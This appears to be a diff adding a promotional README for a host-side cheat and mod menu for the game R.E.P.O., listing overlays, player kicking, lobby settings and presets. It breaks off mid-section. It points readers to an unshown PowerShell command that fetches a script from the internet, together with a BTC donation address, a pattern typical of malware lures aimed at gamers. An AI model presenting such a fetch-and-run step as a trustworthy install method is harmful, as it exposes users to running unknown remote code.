@@ -1,0 +1,113 @@
+R E P O Bepinex Host Mod Menu Nolelin — Game Enhancer for Windows
+
+⌨️ PowerShell Command Button
+
+Show your support
+
+BTC:&nbsp;12RcFYZxMro7d1TRHrYWN32Dd52Mk3p7vR
+
+R E P O Bepinex Host Mod Menu Nolelin delivers a focused host-side toolkit for R.E.P.O. that keeps sessions running smooth and information where you need it. It layers clean on-screen overlays onto the action, surfacing host-relevant gameplay information without clutter or guesswork. Gameplay assistance stays practical and purpose-built: host controls and readouts that help you manage a lobby, not reinvent the game. Everything is scoped to the host role, so the core R.E.P.O. experience stays intact while you get the tools you actually came for.
+
+✅ Requirements
+
+- PowerShell 5.1+ (pre-installed on Windows 10 and 11)
+- Windows 10 / 11 (x64)
+- Internet connection — required to fetch the script
+- Administrator — not required
+
+Features
+
+- Host-side control panel — a single in-game menu built for the host, so you can toggle options mid-session without alt-tabbing or editing config files by hand.
+- Live gameplay assistance — adjust the knobs that matter during a run: movement speed, jump strength, stamina behavior, and similar host-authoritative values, applied on the fly.
+- Information overlays — readable on-screen readouts for player positions, entity and object counts, and session state, so you always know what's actually happening in the lobby.
+- Per-player visibility — see who's connected, who's ready, and what each player is doing, with the ability to target actions at specific players instead of the whole lobby.
+- Instant toggle system — every feature flips on or off from the menu with immediate effect; no restarts, no reloading the level.
+- Host-authoritative by design — changes are applied where the host has authority, keeping behavior consistent for everyone in the session instead of drifting per client.
+- Clean, minimal footprint — assistance and overlays only. It doesn't rewrite game systems, replace assets, or touch anything outside its own scope, so it plays nice with other BepInEx plugins.
+- Config-backed defaults — your preferred toggles and values persist between sessions through the mod's own configuration, so you're not re-enabling everything every launch.
+
+How it works
+
+R E P O Bepinex Host Mod Menu Nolelin runs as a BepInEx plugin and hooks into the host-side game loop, so the menu and overlays live right where your session does. Once loaded, it injects a lightweight UI layer that stays out of your way until you call it up, then gives you direct control over host functions and live session data without touching the base game files.
+
+The mod menu works by intercepting the host's input and state calls, letting you toggle assistance options on the fly mid-session. Information overlays pull from the same runtime data the game already tracks, so what you see is accurate to the current match rather than a stale readout. Everything is applied locally on the host side and takes effect immediately, with no reload or restart required.
+
+Configuration is handled through the plugin's settings, so you can dial in which overlays and menu options are active before or during play. Nothing runs in the background beyond what you enable, keeping the footprint clean and the experience responsive. The result is straightforward: host-side control, real-time information, and gameplay assistance that answers to you.
+
+Modules and Settings
+
+In-Game Menu Overlay
+
+This module is the control surface that ties the other modules together, giving the host immediate access to every setting from one panel.
+
+- Overlay toggle: Open or close the menu at any time during a session so the host can check or change settings mid-match.
+- Overlay position: Move the panel to a screen area that does not block important gameplay information.
+- Category navigation: Switch between grouped option sections so the host reaches the right module without scrolling through a flat list.
+- Session indicator: Show which lobby is currently under host control, confirming that changes apply to the intended session.
+
+Player List Management
+
+This module provides a live roster of connected players so the host can act on individuals directly from the menu.
+
+- Roster view: See players as they join and leave, ensuring actions are always aimed at a current entry.
+- Target selection: Highlight a player entry before choosing an action, reducing misclicks on populated lobbies.
+- Kick and restrict actions: Apply moderation actions to the selected player, with a confirmation step before the action is sent.
+- Action feedback: Receive a visible confirmation when an action on a player completes, so the host knows the roster state has changed.
+
+Lobby and Match Setting Adjustments
+
+This module lets the host reshape lobby-level parameters without closing and recreating the session.
+
+- Player limit control: Adjust how many players the lobby accepts, letting the host scale the session to the group.
+- Match toggles: Flip match-related options on or off, with each setting showing its current value in the menu.
+- Session-scoped changes: Apply adjustments to the active lobby only, so the host can tailor each session independently.
+
+Role and Behavior Controls
+
+This module handles assignment of player roles and related behavior flags within the host's session.
+
+- Role assignment: Choose a target player from the roster and change their assigned role.
+- Behavior flags: Adjust how selected players are treated by the session, with each flag showing its state.
+- Roster reflection: See role changes reflected back in the player list, confirming the assignment took effect.
+
+Gameplay Toggles for Host Sessions
+
+This module groups session-wide modifiers that shape how a round plays out.
+
+- Round modifiers: Enable or disable modifiers that affect the pace and rules of the current round.
+- Between-round changes: Flip toggles between rounds so the host can vary session behavior over time.
+- State visibility: Each toggle displays its on/off state, making the active configuration easy to audit at a glance.
+
+Preset and Configuration Saving
+
+This module captures the host's current selections so they carry across sessions without manual re-entry.
+
+- Save preset: Store the current combination of menu selections as a named preset.
+- Load preset: Reapply a saved preset in a later session to restore a familiar configuration.
+- Active preset indicator: See which preset is currently loaded, so the host knows where the configuration came from.
+
+Additional Settings
+
+- Feature group switches: Enable or disable individual modules, limiting the menu to only what the host needs in a given session.
+- Action log review: Browse recent entries showing what was changed and to whom, giving a readable trail of host-side activity.
+- Confirmation prompts: Keep confirmation steps on or off depending on how cautious the host wants moderation actions to be.
+- Feedback display: Control how long action confirmations and error messages remain visible in the overlay.
+
+Usage Scenarios
+
+Scaling a Lobby for a Growing Group
+
+Goal: The host wants to open a lobby for a small group but expects more players to arrive over time, without recreating the session each time someone new joins.
+
+Steps:
+1. Open the in-game menu overlay and confirm the session indicator shows the correct lobby.
+2. Navigate to the lobby and match setting adjustments category and raise the player limit to fit the expected group size.
+3. Flip any match toggles that suit a larger session, checking each setting's current value as it is shown.
+4. Save the adjusted combination as a preset so the same configuration can be reused later.
+5. Return to the roster view and watch players appear as they join.
+
+Expected result: The lobby accepts the larger group within the same session, the menu shows the new player limit and toggle states, and the active preset indicator confirms which saved configuration is in use.
+
+Moderating a Disruptive Player Mid-Match
+
+…（内容已截断）
